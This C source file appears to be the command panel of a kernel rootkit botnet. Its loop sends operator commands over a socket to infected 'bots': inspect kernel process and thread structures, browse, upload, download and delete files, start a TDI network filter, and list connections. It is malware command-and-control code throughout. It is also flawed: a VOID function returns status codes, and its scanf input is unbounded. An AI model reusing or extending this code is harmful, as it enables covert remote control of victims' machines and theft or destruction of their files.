#include "server_globals.h"

VOID rootkit_cmd(IN SOCKET sock)
{
	char cmd[255] = { 0 };

	while (1)
	{
		printf("\r\n\n\n{ PANEL }->  ");
		scanf("%s", cmd);
		if (!strcmp(cmd, "-h"))
		{
			printf("\r\n[-ps] View remote bot EPROCESS structure");
			printf("\r\n[-th] View remote bot ETHREAD structure");
			printf("\r\n[-ex] Remote File Explorer");
			printf("\r\n[-lm] View Bot loaded modules");
			printf("\r\n[-if] Bot System Information");
			printf("\r\n[-uk] Upload file");
			printf("\r\n[-ku] Download file");
			printf("\r\n[-sf] Start TDI Filter");
			printf("\r\n[-st] Stop TDI Filter");
			printf("\r\n[-bc] Get Bot Connections");
			printf("\r\n[-ki] Kernel Mode injection");
			printf("\r\n[-ld] Load driver");
			printf("\r\n[-fd] Delete file");
			printf("\r\n[-dc] Disconnect from rootkit");

		}
		else if (!strcmp(cmd, "-ps"))
		{
			rootkit_get_processes(sock, ZB_EPROCESS);
		}
		else if (!strcmp(cmd, "-th"))
		{
			rootkit_get_process_ethread(sock, ZB_ETHREAD);
		}
		else if (!strcmp(cmd, "-ex"))
		{
			rootkit_get_kernel_fileexplorer(sock, ZB_FILE_EXPLORER);
		}
		else if (!strcmp(cmd, "-lm"))
		{
			rootkit_get_modules(sock, ZB_MODULES);
		}
		else if (!strcmp(cmd, "-if"))
		{
			rootkit_get_sys_information(sock, ZB_INTERNAL_SYSTEM_INFORMATION);
		}
		else if (!strcmp(cmd, "-uk"))
		{
			rootkit_send_file_to_kernel(sock, ZB_USER_TO_KERNEL_TRANSFER);
		}
		else if (!strcmp(cmd, "-ku"))
		{
			rootkit_get_file_from_kernel(sock, ZB_KERNEL_TO_USER_TRANSFER);
		}
		else if (!strcmp(cmd, "-sf"))
		{
			rootkit_start_TDI_filter(sock, ZB_START_TDI_FILTER);
		}
		else if (!strcmp(cmd, "-st"))
		{
			rootkit_stop_TDI_filter(sock, ZB_STOP_TDI_FILTER);
		}
		else if (!strcmp(cmd, "-ki"))
		{
			return STATUS_NOT_IMPLEMENTED;
		}
		else if (!strcmp(cmd, "-ld"))
		{
			return STATUS_NOT_IMPLEMENTED;
		}
		else if (!strcmp(cmd, "-fd"))
		{
			rootkit_delete_file(sock, ZB_DELETE_FILE);
		}
		else if (!strcmp(cmd, "-dc"))
		{
			rootkit_disconnect_from_driver(sock, ZB_DISCONNECT);
			goto endconn;
		}
		else if (!strcmp(cmd, "-bc"))
		{
			rootkit_get_bot_connections(sock, ZB_GET_BOT_CONNECTIONS);
		}
		else if (!strcmp(cmd, "-cls"))
		{
			system("cls");
		}

	}

endconn:
	closesocket(sock);
	WSACleanup();
	TerminateProcess(GetCurrentProcess(), 1);
}
